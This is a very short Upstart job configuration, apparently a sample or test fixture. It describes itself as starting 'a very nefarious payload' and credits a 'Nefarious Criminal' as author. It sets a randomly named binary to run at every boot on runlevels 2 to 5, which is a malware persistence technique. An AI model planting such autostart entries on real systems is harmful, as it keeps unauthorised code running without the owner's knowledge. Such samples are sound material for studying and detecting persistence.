# boot.conf
description "Start a very nefarious payload"
author "Nefarious Criminal"

start on runlevel [2345]
	exec /usr/bin/CAdxPKWBRWAEbvzUzBtM
 
